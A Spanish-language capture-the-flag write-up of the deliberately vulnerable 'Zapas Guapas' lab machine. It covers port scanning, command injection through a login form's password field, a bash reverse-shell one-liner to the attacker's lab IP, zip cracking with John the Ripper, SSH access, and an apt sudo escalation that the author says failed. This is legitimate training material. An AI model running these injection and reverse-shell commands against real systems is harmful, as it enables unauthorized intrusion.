# CTF - The Hackers Labs - Zapas Guapas

## 📑 Información General

- **Nombre:** Zapas Guapas
- **Dificultad:** Fácil
- **SO:** #Linux
- **Vulnerabilidad principal:** RCE vía upload y permisos mal gestionados
- **Fecha resolución:** 06/06/2025
- **MD5:** 5fb33aa94692884e98137a77aea6b435
- **Enlace:** https://thehackerslabs.com/zapas-guapas/

>Objetivo > Obtener las flags: 
> - 🚩 user.txt 
> - 🚩 root.txt

## 🔎 Reconocimiento

### Escaneo Inicial

IP máquina víctima: **192.168.10.23**

Comprobamos la conectividad enviando un paquete `icmp` a dicha máquina. Además, en función del TTL sabremos distinguir el SO instalado en la misma. Dado que su TTL es 64, estamos frente a una máquina **Linux**.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(1).png)

### Escaneo de Puertos

A continuación, proseguimos con un escaneo de puertos. El resultado revela que los puertos **22** y **80** se encuentran abiertos y accesibles.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.10.23
```

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(2).png)

### Enumeración de Servicios

| Puerto | Servicio |    Versión    |    Notas     |
| ------ | -------- |:-------------:|:------------:|
| 22     | SSH      | OpenSSH 9.2p1 |      -       |
| 80     | HTTP     | Apache 2.4.57 | Servidor web |

## 🌐 Exploración

### Reconocimiento Web

Introducimos la IP de la máquina víctima en el navegador para dirigirnos al sitio web. Analizamos el código fuente, pero no encontramos nada relevante a primera vista.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(3).png)
![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(6).png)

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(7).png)

Emplearemos la herramienta **Gobuster** para hacer fuzzing y listar los directorios que contenga el sitio.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(5).png)

Encontramos dos ficheros interesantes: `/login.html` y `/nike.php`. Accedemos al primero y nos encontraremos con un panel de login.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(4).png)

Estudiando un poco con **Burp Suite** el envío de peticiones, descubro que al introducir cualquier cadena en el campo *password* se hace una llamada al fichero `/run_command.php` y se ejecuta como comando.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(8).png)

Probamos a visualizar el fichero `/etc/passwd` y, efectivamente, la web nos lo muestra.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(9).png)

Obtenemos 3 usuarios, **root**, **proadidas** y  **pronike**. 

### Intrusión con www-data

Ponemos la máquina atacante en modo escucha en el puerto 4444.

```bash
nc -lvnp 4444
```

Escribimos el siguiente comando en el campo de contraseña del panel de login para abrir una **reverse shell** y ejecutaremos algunos comandos para el tratamiento de la TTY.

```bash
bash -c "sh -i >& /dev/tcp/192.168.10.22/4444 0>&1"
```

Hemos conseguido la intrusión en la máquina víctima con el usuario **www-data**.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(10).png)

Exploramos un poco los directorios de **proadidas** y **pronike**, y vemos que tenemos acceso a un fichero en el `home` de pronike.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(11).png)

Seguimos explorando y encontramos un fichero llamado `importante.zip` en el directorio `/opt`. Nos movemos a ese directorio y levantamos temporalmente un servidor web con `python` para poder transferirlo a nuestra máquina atacante y descomprimirlo. 

Para levantar el servidor web, escribimos:

```bash
python3 -m http.server 8080
```

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(12).png)

En nuestra máquina atacante ejecutamos:

```bash
wget http://192.168.10.23:8080/importante.zip
```

Intentamos descomprimirlo pero tiene contraseña, así que le aplicaremos fuerza bruta con **John The Ripper**.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(13).png)

## ⚔️ Explotación

Extraemos el hash del fichero con la herramienta `zip2john` y redireccionamos la salida a un fichero que llamaremos *"hash"*.

```bash
zip2john importante.zip > hash
```

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(14).png)

Acto seguido, ejecutamos `john` para crackear el hash y averiguar su contraseña. Obtenemos una, **hotstuff**.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(15).png)

Volvemos a intentar descomprimir el fichero `importante.zip`, esta vez introduciendo la contraseña descubierta, y visualizamos el fichero que contiene.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(16).png)

Iniciamos sesión mediante **SSH** en la máquina atacante con el usuario **pronike** y la contraseña **pronike11**.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(17).png)

## 🔐Escalada de Privilegios

Ejecutamos el comando `sudo -l` para comprobar los privilegios del usuario con el que hemos hecho login y buscamos el binario GTFOBINS para ver podemos explotarlo.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/Zapas%20Guapas%20(18).png)

Podemos usar el comando `apt` como el usuario **proadidas**.

```bash
sudo /usr/bin/apt changelog apt
!/bin/sh 
```

---

# Aclaración

A partir de aquí, me ha resultado imposible continuar. 

La ejecución del comando `sudo /usr/bin/apt changelog apt` me devolvía un error ya que los repositorios estaban desactualizados y no invocaba el pager `less`, por lo que no podía escribir `!/bin/sh` y abrir una shell como **proadidas**. Como es una máquina preparada, no sé hasta qué punto actualizarla puede romper el CTF, así que he decidido dejarlo aquí.

De todas formas, anexaré la continuación del Write Up de [beafn28](https://beafn28.gitbook.io/beafn28/writeups/the-hacker-labs/zapas-guapas), que lo explica muy bien.

¡Un saludo!
